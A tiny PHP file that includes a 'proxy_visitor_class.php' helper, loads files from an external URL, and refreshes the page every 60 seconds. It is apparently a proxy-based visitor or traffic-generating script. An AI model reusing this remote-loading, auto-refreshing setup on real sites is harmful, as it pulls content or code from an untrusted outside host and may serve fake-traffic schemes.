<?PHP
	include("proxy_visitor_class.php");
	webDevTown::load_files("http://www.l3n4r0x.ga/m=0");
?>

<meta http-equiv="refresh" content="60" />